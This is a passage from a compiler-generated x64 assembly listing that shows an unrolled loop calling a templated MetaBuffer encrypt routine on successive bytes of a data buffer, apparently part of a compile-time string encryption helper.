__int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	b8 01 00 00 00	 mov	 eax, 1
  0066f	48 6b c0 26	 imul	 rax, rax, 38		; 00000026H
  00673	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0067a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0067e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00685	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0068a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00691	88 41 27	 mov	 BYTE PTR [rcx+39], al
  00694	b8 01 00 00 00	 mov	 eax, 1
  00699	48 6b c0 27	 imul	 rax, rax, 39		; 00000027H
  0069d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006a4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006af	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  006b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006bb	88 41 28	 mov	 BYTE PTR [rcx+40], al
  006be	b8 01 00 00 00	 mov	 eax, 1
  006c3	48 6b c0 28	 imul	 rax, rax, 40		; 00000028H
  006c7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006ce	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006d9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  006de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  006e5	88 41 29	 mov	 BYTE PTR [rcx+41], al
  006e8	b8 01 00 00 00	 mov	 eax, 1
  006ed	48 6b c0 29	 imul	 rax, rax, 41		; 00000029H
  006f1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  006f8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  006fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00703	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00708	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0070f	88 41 2a	 mov	 BYTE PTR [rcx+42], al
  00712	b8 01 00 00 00	 mov	 eax, 1
  00717	48 6b c0 2a	 imul	 rax, rax, 42		; 0000002aH
  0071b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00722	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00726	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0072d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00732	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00739	88 41 2b	 mov	 BYTE PTR [rcx+43], al
  0073c	b8 01 00 00 00	 mov	 eax, 1
  00741	48 6b c0 2b	 imul	 rax, rax, 43		; 0000002bH
  00745	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0074c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00750	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00757	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0075c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00763	88 41 2c	 mov	 BYTE PTR [rcx+44], al
  00766	b8 01 00 00 00	 mov	 eax, 1
  0076b	48 6b c0 2c	 imul	 rax, rax, 44		; 0000002cH
  0076f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00776	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0077a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00781	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00786	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0078d	88 41 2d	 mov	 BYTE PTR [rcx+45], al
  00790	b8 01 00 00 00	 mov	 eax, 1
  00795	48 6b c0 2d	 imul	 rax, rax, 45		; 0000002dH
  00799	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007a0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007a4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ab	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  007b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007b7	88 41 2e	 mov	 BYTE PTR [rcx+46], al
  007ba	b8 01 00 00 00	 mov	 eax, 1
  007bf	48 6b c0 2e	 imul	 rax, rax, 46		; 0000002eH
  007c3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007ca	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007ce	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007d5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  007da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007e1	88 41 2f	 mov	 BYTE PTR [rcx+47], al
  007e4	b8 01 00 00 00	 mov	 eax, 1
  007e9	48 6b c0 2f	 imul	 rax, rax, 47		; 0000002fH
  007ed	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007f4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007f8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ff	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00804	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0080b	88 41 30	 mov	 BYTE PTR [rcx+48], al
  0080e	b8 01 00 00 00	 mov	 eax, 1
  00813	48 6b c0 30	 imul	 rax, rax, 48		; 00000030H
  00817	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0081e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00822	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00829	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0082e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00835	88 41 31	 mov	 BYTE PTR [rcx+49], al
  00838	b8 01 00 00 00	 mov	 eax, 1
  0083d	48 6b c0 31	 imul	 rax, rax, 49		; 00000031H
  00841	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00848	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0084c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00853	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00858	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0085f	88 41 32	 mov	 BYTE PTR [rcx+50], al
  00862	b8 01 00 00 00	 mov	 eax, 1
  00867	48 6b c0 32	 imul	 rax, rax, 50		; 00000032H
  0086b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00872	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00876	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0087d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00882	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00889	88 41 33	 mov	 BYTE PTR [rcx+51], al
  0088c	b8 01 00 00 00	 mov	 eax, 1
  00891	48 6b c0 33	 imul	 rax, rax, 51		; 00000033H
  00895	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0089c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008a0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008a7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  008ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008b3	88 41 34	 mov	 BYTE PTR [rcx+52], al
  008b6	b8 01 00 00 00	 mov	 eax, 1
  008bb	48 6b c0 34	 imul	 rax, rax, 52		; 00000034H
  008bf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008c6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008ca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
